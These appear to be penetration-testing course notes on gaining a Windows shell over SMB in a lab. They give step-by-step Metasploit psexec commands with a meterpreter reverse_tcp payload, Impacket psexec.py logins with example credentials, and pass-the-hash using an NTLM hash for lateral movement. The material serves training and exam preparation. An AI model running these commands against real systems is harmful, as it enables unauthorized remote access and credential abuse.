---

### 🛡️ Gaining Shell Access through Metasploit

### Summary 📝

- **Objective**: Use Metasploit and `psexec.py` to gain shell access on a Windows machine via SMB, focusing on understanding both automated and manual approaches.
- **Key Concepts**:
    - **Metasploit**: Automates the attack process with `psexec`.
    - **Manual psexec**: Provides flexibility when Metasploit may be blocked.
    - **Privilege escalation**: Leveraging password hashes or credentials to escalate access to administrative privileges.

---

### Detailed Notes 📜

1. **Launching Metasploit**:
    - Open Kali Linux terminal:
        
        ```bash
        msfconsole
        
        ```
        
    - Search for `psexec` exploit:
        
        ```bash
        search psexec
        
        ```
        
    - Use the `exploit/windows/smb/psexec` module:
        
        ```bash
        use exploit/windows/smb/psexec
        
        ```
        
2. **Setting Payload**:
    - Most target machines are 64-bit, so use the 64-bit payload:
        
        ```bash
        set payload windows/x64/meterpreter/reverse_tcp
        
        ```
        
3. **Configuring Exploit Parameters**:
    - Set your local machine's IP (LHOST):
        
        ```bash
        set LHOST [Your IP]
        
        ```
        
    - Set target machine’s IP (RHOST):
        
        ```bash
        set RHOSTS 192.168.164.139
        
        ```
        
    - Set domain, username, and password:
        
        ```bash
        set smbdomain MARVEL.local
        set smbuser fcastle
        set smbpass Password1
        
        ```
        
4. **Running the Exploit**:
    - Execute the attack:
        
        ```bash
        run
        
        ```
        
    - Once you get a meterpreter session:
        
        ```bash
        background
        
        ```
        
    - List active sessions:
        
        ```bash
        sessions
        
        ```
        
    - Reopen a session:
        
        ```bash
        sessions [session_id]
        
        ```
        
5. **Escalating to Admin**:
    - Switch to admin credentials:
        
        ```bash
        set smbuser administrator
        set smbpass [hashed_password]
        
        ```
        
    - Unset unnecessary parameters:
        
        ```bash
        unset smbdomain
        
        ```
        
6. **Manual Shell Access ([psexec.py](http://psexec.py/))**:
    - If you prefer manual exploitation, use `psexec.py` from Impacket:
        
        ```bash
        psexec.py MARVEL/fcastle:'Password1'@192.168.164.139
        
        ```
        
7. **Using NTLM Hashes**:
    - If you have the NTLM hash but not the password, use it directly:
        
        ```bash
        psexec.py administrator@192.168.164.139 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
        
        ```
        

### 📌 Additional Explanation & Key Point 💡

- **Explanation**: Using **SAM hashes** to gain access to other machines is similar to using **domain account credentials** (e.g., usernames and passwords) to move laterally within a network. Both methods exploit the trust relationships that exist in networked systems.
- **Key Point**: Whether using **domain account credentials** or **SAM hashes**, the idea is to leverage compromised credentials to access additional machines within the network, expanding control. This process is a form of **lateral movement**.

---

### Abbreviations & Definitions 🔍

- **SMB (Server Message Block)**: Protocol for sharing files and printers.
- **NTLM (NT LAN Manager)**: Microsoft’s authentication protocol used for password hashing.
- **Meterpreter**: Advanced payload in Metasploit allowing post-exploitation control.
- **psexec**: Tool used to execute processes on remote systems.

---

### Critical Mentions & Exam Traps 🚨

- **🚨 Default Payload**: Ensure you use the `windows/x64/meterpreter/reverse_tcp` payload for 64-bit systems.
- **🚨 Hashes Can Be Used Without Cracking**: You can log in with an NTLM hash without needing the plaintext password—this is crucial for exams.
- **💡 Alternatives to psexec**: If `psexec.py` fails or is blocked, try `wmiexec.py` or `smbexec.py`.
- **💡 Password Complexity**: If a password has special characters, omit it in the command and enter it manually when prompted.

---
